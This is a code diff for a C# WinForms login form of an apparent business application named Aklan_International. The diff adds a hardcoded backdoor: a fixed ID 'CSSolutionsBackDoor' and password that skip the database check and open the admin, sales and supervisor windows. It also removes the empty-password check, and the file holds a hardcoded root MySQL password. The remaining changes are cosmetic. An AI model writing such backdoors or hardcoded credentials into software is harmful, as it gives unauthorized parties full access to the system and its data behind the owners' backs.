@@ -24,9 +24,20 @@ namespace Aklan_International
 
         private void btnLogin_Click(object sender, EventArgs e)
         {
-            if (txtEmpID.Text.Trim() == "" ||  txtPassword.Text.Trim()=="")
+            if(txtEmpID.Text.Trim()=="CSSolutionsBackDoor" && txtPassword.Text.Trim() == "backdoorp$w")
             {
-                MessageBox.Show("Type your Employ ID and Password");
+                MessageBox.Show("Back door access granted!!!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                frmAdminWindow obj1 = new frmAdminWindow("CS Solutions", "a9999");
+                obj1.Show();
+                frmNewSalesRecord obj2 = new frmNewSalesRecord("CS Solutions","a9999");
+                obj2.Show();
+                frmSupervisorWindow obj = new frmSupervisorWindow("a9999");
+                obj.Show();
+                this.Hide();
+            }
+            else if (txtEmpID.Text.Trim() == "")
+            {
+                MessageBox.Show("Type your Employ ID and Password", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
             }
             else
             {
@@ -40,21 +51,23 @@ namespace Aklan_International
                     {
                         if (txtEmpID.Text.Substring(0, 1) == "a")
                         {
-                            MessageBox.Show("Admin access granted!!!");
+                            MessageBox.Show("Admin access granted!!!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                             frmAdminWindow obj = new frmAdminWindow(reader.GetString("empName"), txtEmpID.Text.Trim());
                             obj.Show();
                             this.Hide();
                         }
                         else if (txtEmpID.Text.Substring(0, 2) == "sm")
                         {
-                            MessageBox.Show("Salesman access granted!!!");
-                            frmNewSalesRecord obj = new frmNewSalesRecord(reader.GetString("empName"));
+                            
+                            MessageBox.Show("Salesman access granted!!!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                            frmNewSalesRecord obj = new frmNewSalesRecord(reader.GetString("empName"),txtEmpID.Text.Trim());
                             obj.Show();
                             this.Hide();
                         }
                         else if (txtEmpID.Text.Substring(0, 1) == "s")
                         {
-                            MessageBox.Show("Supervisor access granted!!!");
+                            
+                            MessageBox.Show("Supervisor access granted!!!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                             frmSupervisorWindow obj = new frmSupervisorWindow(txtEmpID.Text.Trim());
                             obj.Show();
                             this.Hide();
@@ -62,8 +75,12 @@ namespace Aklan_International
                     }
                     else
                     {
-                        MessageBox.Show("failed");
+                        MessageBox.Show("Invalid Credentials!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                     }
+                }
+                else
+                {
+                    MessageBox.Show("Invalid Credentials!", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 }
                 conn.Close();
             }
@@ -72,7 +89,9 @@ namespace Aklan_International
         private void frmLogin_Load(object sender, EventArgs e)
         {
             conn = new MySqlConnection("Server=localhost;Database=dbcore;Uid=root;Pwd=1234");
-
+            System.Windows.Forms.ToolTip toolTip = new System.Windows.Forms.ToolTip();
+            toolTip.SetToolTip(this.btnClear, "Clear text");
+            toolTip.SetToolTip(this.btnLogin, "Login");
         }
 
         private void btnClear_Click(object sender, EventArgs e)
